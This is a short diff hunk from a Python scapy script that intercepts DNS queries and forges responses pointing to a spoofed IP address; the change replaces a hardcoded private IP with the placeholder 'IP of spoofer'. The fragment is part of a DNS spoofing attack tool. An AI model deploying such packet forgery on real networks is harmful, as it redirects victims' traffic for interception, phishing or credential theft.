@@ -18,7 +18,7 @@ def process_packet(packet):
             print("[+] Spoofing target")
 
             # Create a DNS response with the spoofed IP address
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168.25.145")
+            answer = scapy.DNSRR(rrname=qname, rdata="IP of spoofer")
 
             # Modify the DNS packet to include the spoofed response
             scapy_packet[scapy.DNS].an = answer
